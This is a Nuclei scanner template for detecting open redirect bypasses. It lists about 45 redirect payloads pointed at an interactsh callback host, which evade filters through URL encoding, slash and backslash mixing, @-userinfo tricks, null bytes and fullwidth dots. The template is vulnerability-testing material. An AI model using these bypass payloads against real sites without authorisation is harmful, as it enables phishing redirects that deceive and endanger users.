id: open-redirect-bypass

info:
  name: Open Redirect Bypass
  author: ritikchaddha
  severity: medium
  metadata:
    max-request: 1
  tags: redirect,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      redirect:
        - "{{Hostname}}.{{interactsh-url}}"
        - "//{{interactsh-url}}"
        - '////{{interactsh-url}}'
        - "https:{{interactsh-url}}"
        - '\/\/{{interactsh-url}}/'
        - '/\/{{interactsh-url}}/'
        - "oast。me"
        - "//oast%E3%80%82me"
        - "//oast%00.me"
        - "@{{interactsh-url}}/"
        - '/\{{Hostname}}%40{{interactsh-url}}'
        - "{{Hostname}}@{{interactsh-url}}/"
        - "{{RootURL}}/http://www.{{interactsh-url}}/"
        - "{{RootURL}}?http://www.{{interactsh-url}}/"
        - '%09/{{interactsh-url}}/'
        - '%5C%5C{{interactsh-url}}/%252e%252e%252f'
        - '%5C{{interactsh-url}}'
        - '%5c{{interactsh-url}}/%2f%2e%2e'
        - '%5c{{RootURL}}{{interactsh-url}}/%2f%2e%2e'
        - '../{{interactsh-url}}'
        - '.{{interactsh-url}}'
        - '/%5c{{interactsh-url}}'
        - '////\;@{{interactsh-url}}'
        - '///{{interactsh-url}}'
        - '///{{interactsh-url}}/%2f%2e%2e'
        - '///{{interactsh-url}}@//'
        - '///{{RootURL}}{{interactsh-url}}/%2f%2e%2e'
        - '//;@{{interactsh-url}}'
        - '//\/{{interactsh-url}}/'
        - '//\@{{interactsh-url}}'
        - '//\{{interactsh-url}}'
        - '//\t{{interactsh-url}}/'
        - '//{{interactsh-url}}/%2F..'
        - '//{{interactsh-url}}//'
        - '//%69%6e%74%65%72%61%63%74%2e%73%68'
        - '//{{interactsh-url}}@//'
        - '//{{interactsh-url}}\t{{interactsh-url}}/'
        - '//https://{{interactsh-url}}@//'
        - '/<>//{{interactsh-url}}'
        - '/\/\/{{interactsh-url}}/'
        - '/\/{{interactsh-url}}'
        - '/\{{interactsh-url}}'
        - '/{{interactsh-url}}'
        - '/{{interactsh-url}}/%2F..'
        - '/{{interactsh-url}}/'
        - '/{{interactsh-url}}/..;/css'
